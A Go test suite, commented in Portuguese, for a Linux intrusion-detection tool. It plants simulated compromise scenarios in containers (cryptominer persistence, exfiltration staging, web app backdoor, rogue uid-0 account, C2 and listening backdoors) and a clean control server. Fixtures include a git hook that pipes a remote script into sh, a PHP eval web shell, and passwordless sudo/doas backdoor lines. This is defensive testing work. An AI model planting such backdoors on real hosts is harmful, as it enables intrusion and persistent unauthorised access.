package scenario

// Cenários de SITUAÇÃO, não de mecanismo.
//
// Os cenários do arquivo principal exercitam um check por vez: planta o
// artefato que aquele check procura e verifica que ele dispara. É necessário e
// não é suficiente — provado quando a cadeia completa do cenário 66 saiu com
// "RESULT: OK", cada peça invisível porque nenhuma isolada era o que algum
// check procurava.
//
// Os cinco daqui são o oposto. Cada um é uma HISTÓRIA inteira — como o invasor
// entrou, o que instalou, como voltou — e o contrato não é "o check X
// disparou", é "o operador entendeu o que aconteceu". Um deles não tem invasor
// nenhum, e é o mais importante.
//
// A ordem é a das perguntas que a ferramenta precisa responder:
//
//	80  e quando NÃO há ataque?           o custo em atenção do operador
//	81  minerador                         o comprometimento mais comum que existe
//	82  exfiltração                       o mais caro quando acontece
//	83  aplicação web                     a porta de entrada mais comum
//	84  credencial                        a mais antiga, e ainda a mais usada
//	86  C2                                o canal, visto pela ORIGEM e não pelo destino
//	87  backdoor de escuta                o oposto do shell reverso
//	88  serviço substituído               a porta conhecida com outro ocupante

func init() {
	Register(Scenario{
		ID:   "80-servidor-legitimo",
		Desc: "servidor de produção real, sem invasor nenhum: mede o custo em atenção",
		// ESTE CENÁRIO NÃO TEM ATAQUE. É o mais importante da suíte.
		//
		// Todo detector acerta o positivo se puder gritar sempre. O que decide
		// se a ferramenta é usável numa frota é o que ela diz quando não há
		// nada — e um servidor de produção de verdade não se parece nada com a
		// imagem base limpa que os outros cenários usam.
		//
		// Aqui tem dois anos de acúmulo, e cada item existe em servidor real:
		//
		//	node e rclone instalados à mão, fora do gerenciador de pacotes
		//	agente de APM com preload em /opt
		//	certbot com timer E cron, porque a distro entrega os dois
		//	backup noturno por rclone, com config no home do root
		//	três chaves SSH, uma delas de automação com command= restrito
		//	integração de diretório central por AuthorizedKeysCommand
		//	CA corporativa do proxy de inspeção
		//	nvm no fim do .bashrc, depois de 25 aliases
		//	hook de git de deploy
		//	espelho de pacote interno no /etc/hosts
		//	gente no grupo docker
		//
		// A ferramenta TEM coisas verdadeiras a dizer sobre quase tudo isso:
		// binário sem dono de pacote É um fato, CA fora do bundle É um fato,
		// grupo docker É root por outro caminho. Nenhum é falso positivo — são
		// achados corretos sobre um host que ninguém invadiu.
		//
		// O contrato é duplo, e as duas metades importam:
		//
		//	CRÍTICO nenhum       nada aqui é ataque, e crítico é o que acorda
		//	                     alguém de madrugada
		//	orçamento de aviso   acima de uma dúzia o operador aprende a
		//	                     ignorar a saída, e aí perde o achado que importa
		Images: matriz,
		Plant:  servidorLegitimo,
		// Nenhum destes pode disparar: são os checks que descrevem ATAQUE, e
		// não há ataque nenhum aqui. A lista é a parte que mais dói quando
		// quebra — cada entrada é um jeito de a ferramenta virar ruído.
		Forbid: []string{
			"correlate.persistence_redundant", // certbot em timer E cron não é redundância de invasor
			"proc.kthread_disguise",
			"proc.exe_deleted",
			"proc.memfd_exec",
			"correlate.revshell",
			"net.pivot",
			"persist.unit_dropin_exec", // a unit da API é própria, não drop-in em unit alheia
			"persist.shell_startup",    // nvm no fim do .bashrc é rotina
			"persist.trigger_exec",     // hook de deploy é o uso normal de hook de git
			"persist.sshd_key_source",  // AuthorizedKeysCommand do sssd é integração conhecida
			"priv.no_password",
			"priv.uid_zero",
			"persist.ld_preload_global", // ld.so.conf.d NÃO é ld.so.preload
			"proc.shell_from_service",
			"proc.service_account_pty",
			"cross.hidden_pid",
			"cross.thread_count",
			"cross.module_view",
		},
		// O orçamento. Este número é uma decisão de produto: é quantos avisos
		// um operador consegue triar por host sem parar de ler.
		MaxWarn: 10,
		Exit:    1,
		// E a cobertura precisa ficar completa: degradar num host normal seria
		// a outra forma de virar ruído.
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "81-minerador-oportunista",
		Desc: "criptominerador: o comprometimento mais comum que existe em VM exposta",
		// É o que realmente acontece. Serviço exposto, exploração automatizada,
		// minerador em segundos — sem operador do outro lado, sem interesse no
		// conteúdo do host, só CPU.
		//
		// O invasor aqui é um SCRIPT, e isso define o perfil: ele é
		// descuidado onde não precisa se esconder e cuidadoso onde já
		// aprendeu que o pegam.
		//
		//	/tmp/.X11-unix payload escondido num diretório que existe de verdade,
		//	               em tmpfs que some no reboot — e por isso a persistência
		//	               precisa REBAIXAR uma cópia para o disco
		//	exec -a        disfarce de thread de kernel, que é grátis
		//	rwx anônimo    a forma do minerador, que gera código em memória
		//	cron @reboot   volta depois do reboot que apagou o /dev/shm
		//	unit systemd   e volta se o cron for limpo
		//
		// A ferramenta tem várias entradas para isto, e o contrato exige as
		// duas classes: as que veem o PROCESSO e as que veem a VOLTA.
		//
		// LIMITE DO CONTÊINER: o alvo natural seria /dev/shm, que é onde o
		// minerador cai com mais frequência. O Docker monta /dev/shm com
		// `noexec` e nada executa de lá — num servidor real ele é executável.
		// O /tmp exercita a MESMA forma (tmpfs, volátil, gravável por todos) e
		// roda nos dois lugares.
		Images: matriz,
		Plant:  mineradorOportunista,
		Expect: []Expect{
			// O disfarce. Um kworker de verdade não tem exe.
			{ID: "proc.kthread_disguise", Sev: "CRITICAL", Evidence: "kworker"},
			// O caminho. tmpfs é executável e não sobrevive ao reboot.
			{ID: "proc.suspicious_path", Evidence: "/tmp/.X11-unix"},
			// A memória: o minerador gera código em tempo de execução.
			{ID: "proc.maps_rwx_anon"},
			// A VOLTA, que é a metade que sobrevive ao reboot. Dois mecanismos
			// apontando para o mesmo binário rebaixado — e dois é AVISO, não
			// crítico: o salto para crítico é a partir de três, porque dois têm
			// explicação legítima (transição de SysV para systemd).
			{ID: "correlate.persistence_redundant", Sev: "WARN",
				Subject: "/var/tmp/.systemd-cache/kswapd0"},
			{ID: "persist.cron_suspect"},
			{ID: "persist.unit_exec_suspect"},
		},
		ExpectOutput: []string{"sinais no mesmo alvo"},
		Exit:         2,
	})

	Register(Scenario{
		ID:   "82-exfiltracao",
		Desc: "coleta e envio de dados: staging comprimido e ferramenta de nuvem com config nova",
		// O comprometimento mais caro. Não há payload chamativo nem minerador
		// queimando CPU — o invasor usa as ferramentas que JÁ estão no host,
		// ou instala uma que ninguém questiona.
		//
		// E é aqui que a ferramenta encontra o próprio limite com honestidade:
		// rclone é uma ferramenta de backup legítima, e o cenário 80 tem
		// rclone também. A diferença entre os dois casos NÃO está no binário.
		//
		//	no 72   rclone com dono de pacote plausível, config antiga, cron
		//	        noturno, destino declarado
		//	aqui    rclone caído em /usr/local/bin sem dono, config nova, e
		//	        staging comprimido no /var/tmp que ninguém explica
		//
		// A ferramenta NÃO consegue dizer qual é qual sozinha, e não vai
		// fingir que consegue: o que ela faz é dizer o que o nome MUDA — que
		// existe uma ferramenta de transferência para nuvem configurada neste
		// host — e entregar a pergunta ao operador, que é quem sabe se o
		// backup para nuvem faz parte do desenho.
		Images: matriz,
		Plant:  exfiltracao,
		Expect: []Expect{
			{ID: "tool.artifact", Subject: "rclone"},
			{ID: "tool.binary", Subject: "rclone"},
			{ID: "integrity.no_package_owner", Subject: "/usr/local/bin/rclone"},
			// A chave que garante a volta enquanto os dados sobem.
			{ID: "persist.ssh_keys", Sev: "MANUAL"},
		},
		// Correlação por sujeito: config e binário da MESMA ferramenta viram um
		// bloco, e é isso que faz o operador ver "rclone" em vez de dois avisos
		// soltos.
		ExpectOutput: []string{"sinais no mesmo alvo", "rclone"},
		Exit:         1,
	})

	Register(Scenario{
		ID:   "83-comprometimento-de-aplicacao",
		Desc: "aplicação web explorada: shell filho do daemon, e a volta plantada onde a app roda",
		// A porta de entrada mais comum, e a que menos se parece com invasão
		// quando se olha um processo por vez.
		//
		// A sequência é sempre a mesma: upload ou deserialização vira execução
		// dentro do processo da aplicação, e a partir dali tudo acontece com a
		// identidade dela.
		//
		//	nginx → sh → curl     nenhum dos três é suspeito. A LINHAGEM é.
		//	hook de git           roda no deploy, com o privilégio do deploy
		//	auto_prepend_file     todo request de PHP passa a executar algo
		//
		// Os três checks aqui olham lugares diferentes e contam a MESMA
		// história — e é a repetição em lugares independentes que separa isto
		// de um administrador rodando um comando.
		Images: matriz,
		Plant:  comprometimentoDeAplicacao,
		Expect: []Expect{
			// A linhagem, que é o achado que não existe sem árvore de processos.
			{ID: "proc.shell_from_service", Sev: "CRITICAL", Evidence: "não abre shell"},
			// A cadeia inteira, que é o que separa isto de um comando de
			// administrador: o shell não parou nele, gerou outra coisa.
			{ID: "proc.shell_from_service", Evidence: "e o shell gerou"},
			// A volta, plantada em dois lugares que a aplicação toca.
			{ID: "persist.trigger_exec", Subject: "post-checkout"},
			{ID: "persist.web_prepend"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "84-acesso-por-credencial",
		Desc: "entrada por senha fraca: conta nova com uid 0, sudoers e chave, sem payload nenhum",
		// O vetor mais antigo, e ainda o mais usado. Não há exploração, não há
		// binário estranho, não há processo suspeito — o invasor simplesmente
		// ENTROU, e a partir daí tudo o que ele faz é administração normal.
		//
		// É o cenário que derruba qualquer detector baseado em payload: não
		// existe payload. O que existe é uma diferença no estado da máquina:
		//
		//	conta com uid 0        para o kernel, é root — o nome não importa
		//	campo de senha vazio   não é senha fraca: é a ausência da pergunta
		//	drop-in de sudoers     NOPASSWD:ALL num arquivo que ninguém lê
		//	chave SSH sem restrição   a volta, e ela não tem command=
		//
		// Nenhum deles precisa de processo em execução, e todos sobrevivem ao
		// reboot. É também o cenário que melhor exercita o modo IMAGE — não há
		// nada de vivo para ver, e a varredura de rootfs desligado devolve
		// exatamente o mesmo conjunto.
		Images: matriz,
		Plant:  acessoPorCredencial,
		Expect: []Expect{
			{ID: "priv.uid_zero", Sev: "CRITICAL", Subject: "sysadm"},
			{ID: "priv.no_password", Sev: "CRITICAL", Subject: "sysadm"},
			{ID: "priv.sudo_nopasswd", Sev: "CRITICAL", Subject: "sysadm"},
			{ID: "priv.doas_nopasswd", Sev: "CRITICAL", Subject: ":wheel"},
			{ID: "persist.ssh_keys", Sev: "MANUAL"},
		},
		Exit: 2,
	})

	// E o mesmo host, desligado. Se a resposta divergir do 84, uma das duas
	// varreduras está mentindo — e o modo image é o que se usa quando o host
	// já não é confiável para rodar nada.
	Register(Scenario{
		ID:     "85-acesso-por-credencial-imagem",
		Desc:   "o mesmo host do 84 varrido como rootfs desligado: a resposta não pode divergir",
		Images: []string{"debian:12"},
		Mode:   Image,
		Plant:  acessoPorCredencial,
		Expect: []Expect{
			{ID: "priv.uid_zero", Sev: "CRITICAL", Subject: "sysadm"},
			{ID: "priv.no_password", Sev: "CRITICAL", Subject: "sysadm"},
			{ID: "priv.sudo_nopasswd", Sev: "CRITICAL", Subject: "sysadm"},
			{ID: "priv.doas_nopasswd", Sev: "CRITICAL", Subject: ":wheel"},
		},
		Exit: 2,
	})
	// -----------------------------------------------------------------------
	// Rede.
	//
	// Os dois checks de rede antigos olham a FORMA da conexão — descritores no
	// revshell, direção no pivô. Os três daqui exercitam a outra pergunta, que
	// é sobre QUEM está do lado de cá: o binário veio de um pacote?
	//
	// Todos usam o mesmo rig dos cenários 40 e 42: endereço público criado como
	// apelido em `lo`, dentro de um namespace de rede isolado. O endereço é
	// público para quem classifica escopo, e nenhum pacote sai da máquina — que
	// é a única forma honesta de testar saída para a internet.
	// -----------------------------------------------------------------------

	Register(Scenario{
		ID:        "86-c2-por-origem",
		Desc:      "canal de comando e controle reconhecido pela ORIGEM, sem consultar reputação de destino",
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		// O implante aqui é bem-comportado em tudo que os outros checks olham:
		// caminho de sistema, nome plausível, sem descritor padrão sobre o
		// socket, sem disfarce de kthread.
		//
		// A porta de destino é arbitrária DE PROPÓSITO. Um C2 real usaria 443
		// para se misturar, e o check não olha a porta de destino nem o
		// endereço — usar 443 aqui sugeriria que olha.
		//
		// O que sobra é a pergunta que não depende do invasor: NINGUÉM
		// empacotou este binário, e ele fala com a internet.
		//
		// É de propósito que nenhuma lista de reputação seja consultada. Ela
		// envelhece em dias, exige fonte externa e falha justamente contra quem
		// alugou infraestrutura ontem — que é a maioria.
		Plant: `mkdir -p /usr/local/sbin
			cp /helper /usr/local/sbin/systemd-resolve-helper
			ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			/helper listen 198.51.100.241:8443 &
			sleep 0.4
			/usr/local/sbin/systemd-resolve-helper connect 198.51.100.241:8443 &
			sleep 0.5`,
		Expect: []Expect{
			{ID: "net.egress_unowned", Sev: "WARN", Evidence: "198.51.100.241:8443"},
			{ID: "net.egress_unowned", Evidence: "nenhuma lista de reputação"},
		},
		// Sem descritor padrão sobre o socket não há shell, e sem saída interna
		// não há pivô: os checks de rede olham a mesma tabela e não podem se
		// confundir.
		Forbid:         []string{"correlate.revshell", "net.pivot"},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:        "87-backdoor-de-escuta",
		Desc:      "porta alta aberta para fora por binário sem dono: o oposto do shell reverso",
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		// É o que sobra quando o firewall de SAÍDA é rígido: o invasor não
		// consegue ligar para fora, então abre uma porta e espera.
		//
		// Escutar não é suspeito — é o que todo servidor faz. O que este
		// cenário exercita é o cruzamento: escuta em endereço NÃO-loopback,
		// vinda de binário que nenhum pacote entregou.
		Plant: `mkdir -p /usr/local/sbin
			cp /helper /usr/local/sbin/systemd-logind-helper
			ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			/usr/local/sbin/systemd-logind-helper listen 198.51.100.241:41337 &
			sleep 0.5`,
		Expect: []Expect{
			{ID: "net.listener_unowned", Sev: "WARN", Evidence: "41337"},
			{ID: "net.listener_unowned", Evidence: "aberta para fora"},
		},
		Forbid:         []string{"correlate.revshell", "net.pivot", "net.egress_unowned"},
		Exit:           1,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:        "88-servico-substituido",
		Desc:      "porta de serviço conhecido ocupada por outro binário: substituição, não aplicação nova",
		Images:    minimal,
		Caps:      []string{"NET_ADMIN"},
		NoNetwork: true,
		// A mesma forma do 87 com uma diferença que muda a severidade inteira.
		//
		// Um binário sem dono na porta 41337 é aplicação que alguém instalou e
		// não empacotou — comum, e por isso AVISO. O mesmo binário na porta 22
		// não é aplicação nova: é o serviço substituído, porque a porta 22 já
		// tinha ocupante e ele veio de um pacote.
		//
		// O cenário existe para travar essa distinção: sem ela, o sshd
		// trojanizado sai com o mesmo peso de um agente interno qualquer.
		Plant: `mkdir -p /usr/local/sbin
			cp /helper /usr/local/sbin/sshd
			ip link set lo up
			ip addr add 198.51.100.241/32 dev lo
			/usr/local/sbin/sshd listen 198.51.100.241:22 &
			sleep 0.5`,
		Expect: []Expect{
			{ID: "net.listener_unowned", Sev: "CRITICAL", Evidence: "porta é a de SSH"},
			{ID: "net.listener_unowned", Evidence: "substituição, não"},
		},
		Exit:           2,
		MustBeComplete: true,
	})
}

// ---------------------------------------------------------------------------
// Os plantios.
// ---------------------------------------------------------------------------

// servidorLegitimo é dois anos de operação normal. Nada aqui é ataque.
const servidorLegitimo = `
mkdir -p /usr/local/bin /opt/apm/lib /etc/systemd/system/multi-user.target.wants \
  /etc/cron.d /root/.ssh /etc/ssh/sshd_config.d /usr/local/share/ca-certificates \
  /srv/app/.git/hooks /etc/ld.so.conf.d /root/.config/rclone

# app Node instalado à mão, que é como quase todo mundo instala Node
cp /helper /usr/local/bin/node
printf '[Unit]\nDescription=API\n[Service]\nExecStart=/usr/local/bin/node /srv/app/server.js\nRestart=always\nUser=app\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/api.service
ln -sf /etc/systemd/system/api.service /etc/systemd/system/multi-user.target.wants/api.service

# agente de APM: instrumentação legítima, e ld.so.conf.d NÃO é ld.so.preload
cp /helper /opt/apm/lib/libapm.so
printf '/opt/apm/lib\n' > /etc/ld.so.conf.d/apm.conf

# certbot vem com timer E cron: a distro entrega os dois, e não é redundância
printf '[Timer]\nOnCalendar=*-*-* 03:17:00\n' > /etc/systemd/system/certbot.timer
printf '0 */12 * * * root test -x /usr/bin/certbot && /usr/bin/certbot renew -q\n' > /etc/cron.d/certbot

# backup noturno com rclone, config no home do root
cp /helper /usr/local/bin/rclone
printf '[s3-backup]\ntype = s3\nprovider = AWS\n' > /root/.config/rclone/rclone.conf
printf '17 2 * * * root /usr/local/bin/rclone sync /srv/app s3-backup:app\n' > /etc/cron.d/backup

# três chaves: duas de gente do time, uma de automação COM restrição
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploChaveDeTeste ana@estacao\n' >> /root/.ssh/authorized_keys
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploChaveDaAna ana@notebook\n' >> /root/.ssh/authorized_keys
printf 'restrict,command="/usr/bin/rrsync -ro /srv",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploDoBackup backup@nas\n' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# integração de diretório central: o sssd é quem responde quais chaves valem
printf 'AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys\nAuthorizedKeysCommandUser root\nPort 22\n' > /etc/ssh/sshd_config

# CA corporativa do proxy de inspeção
printf -- '-----BEGIN CERTIFICATE-----\nQ29ycG9yYXRlUHJveHlDQQ==\n-----END CERTIFICATE-----\n' > /usr/local/share/ca-certificates/corp-proxy.crt

# nvm no fim do .bashrc, depois dos aliases — a posição normal
i=1; while [ $i -le 25 ]; do printf 'alias a%d="ls -la"\n' $i >> /root/.bashrc; i=$((i+1)); done
printf '\nexport NVM_DIR="$HOME/.nvm"\n[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"\n' >> /root/.bashrc

# hook de git de deploy: o uso NORMAL de hook de git
printf '#!/bin/sh\ncd /srv/app && npm ci --omit=dev && systemctl reload api\n' > /srv/app/.git/hooks/post-merge
chmod +x /srv/app/.git/hooks/post-merge

# espelho de pacote interno
printf '10.0.0.20 mirror.interno.corp\n' >> /etc/hosts

# um dev no grupo docker
printf 'docker:x:998:deploy\n' >> /etc/group

# e a aplicação rodando
/usr/local/bin/node sleep 300 &
sleep 0.4
`

// mineradorOportunista é o comprometimento automatizado de VM exposta.
const mineradorOportunista = `
mkdir -p /tmp/.X11-unix /var/tmp/.systemd-cache /etc/systemd/system/multi-user.target.wants \
  /var/spool/cron/crontabs /etc/cron.d

# o payload escondido num diretório que existe de verdade, em tmpfs
cp /helper /tmp/.X11-unix/.x
chmod 755 /tmp/.X11-unix/.x

# rodando disfarçado de thread de kernel, com mapeamento rwx anônimo
/tmp/.X11-unix/.x argv0 '[kworker/2:1H]' /tmp/.X11-unix/.x rwx &

# e a cópia rebaixada para o disco, que é o que sobrevive ao reboot
cp /helper /var/tmp/.systemd-cache/kswapd0
chmod 755 /var/tmp/.systemd-cache/kswapd0

# dois caminhos de volta para o MESMO binário
printf '@reboot root /var/tmp/.systemd-cache/kswapd0 sleep 86400\n' > /etc/cron.d/systemd-cache
printf '[Unit]\nDescription=System Cache Manager\n[Service]\nExecStart=/var/tmp/.systemd-cache/kswapd0 sleep 86400\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/systemd-cached.service
ln -sf /etc/systemd/system/systemd-cached.service /etc/systemd/system/multi-user.target.wants/systemd-cached.service
sleep 0.4
`

// exfiltracao é coleta e envio usando ferramenta que ninguém questiona.
const exfiltracao = `
mkdir -p /usr/local/bin /root/.config/rclone /var/tmp/.cache /root/.ssh

# a ferramenta, caída sem passar por gerenciador de pacotes
cp /helper /usr/local/bin/rclone
chmod 755 /usr/local/bin/rclone

# config NOVA, apontando para um destino que não é do time
printf '[remote]\ntype = webdav\nurl = https://backup-cdn.example.net/dav\nvendor = other\n' > /root/.config/rclone/rclone.conf

# o staging: dados coletados e comprimidos, esperando a janela de envio
head -c 4096 /dev/urandom > /var/tmp/.cache/db-dump.tar.gz
head -c 2048 /dev/urandom > /var/tmp/.cache/etc.tar.gz

# a volta, para o caso de a transferência levar dias
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploDeChaveInserida root@localhost\n' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# e a transferência em curso
/usr/local/bin/rclone sleep 300 &
sleep 0.4
`

// comprometimentoDeAplicacao é execução dentro do processo da aplicação.
const comprometimentoDeAplicacao = `
mkdir -p /usr/sbin /srv/www/.git/hooks /etc/php/8.2/fpm/conf.d /var/www

# o daemon de rede. O nome é o que a árvore de processos vai ler.
cp /helper /usr/sbin/nginx

# nginx → sh → curl: nenhum dos três é suspeito, a linhagem é
# sh -c "sleep 300" faz EXEC e vira sleep: o shell some antes da varredura.
# Com dois comandos o shell continua vivo e gera filho — e é o filho que conta
# a história, porque é onde o curl aparece numa invasão de verdade.
/usr/sbin/nginx spawn /bin/sh -c 'sleep 300; :' &
sleep 0.5

# a volta, nos dois lugares que a aplicação toca
printf '#!/bin/sh\ncurl -fsSL http://203.0.113.207/s.sh | sh\n' > /srv/www/.git/hooks/post-checkout
chmod +x /srv/www/.git/hooks/post-checkout
printf 'auto_prepend_file = /var/www/.init.php\n' > /etc/php/8.2/fpm/conf.d/99-init.ini
printf '<?php @eval($_SERVER["HTTP_X_INIT"]); ?>\n' > /var/www/.init.php
sleep 0.4
`

// acessoPorCredencial é entrada por senha, sem payload nenhum.
const acessoPorCredencial = `
mkdir -p /etc/sudoers.d /root/.ssh /home/sysadm/.ssh

# uma conta nova. Para o kernel, uid 0 É root — o nome não muda nada.
printf 'sysadm:x:0:0:System Admin:/home/sysadm:/bin/bash\n' >> /etc/passwd
printf 'sysadm::20000:0:99999:7:::\n' >> /etc/shadow

# o /etc/sudoers de fábrica, que é o que faz o sudoers.d ser lido: sem esta
# linha o drop-in abaixo seria INERTE, e a ferramenta segue o mesmo grafo de
# include que o sudo segue. A imagem base não traz sudo, então o arquivo é
# plantado explicitamente — como todo host com sudo o tem.
printf 'root ALL=(ALL:ALL) ALL\n@includedir /etc/sudoers.d\n' > /etc/sudoers
chmod 440 /etc/sudoers

# sudo sem senha, num arquivo que ninguém abre
printf 'sysadm ALL=(ALL) NOPASSWD:ALL\n' > /etc/sudoers.d/90-sysadm
chmod 440 /etc/sudoers.d/90-sysadm

# doas sem senha: o mesmo backdoor no arquivo que quase ninguém audita porque
# o reflexo é procurar em /etc/sudoers. Aqui num host que usa sudo, o que torna
# a regra dupla anomalia — root sem senha por dois caminhos.
printf 'permit nopass keepenv :wheel\n' > /etc/doas.conf

# e a volta, sem restrição nenhuma: o invasor quer shell
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploDeAcessoRemoto sysadm@vps\n' >> /root/.ssh/authorized_keys
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExemploDeAcessoRemoto sysadm@vps\n' >> /home/sysadm/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys /home/sysadm/.ssh/authorized_keys
`
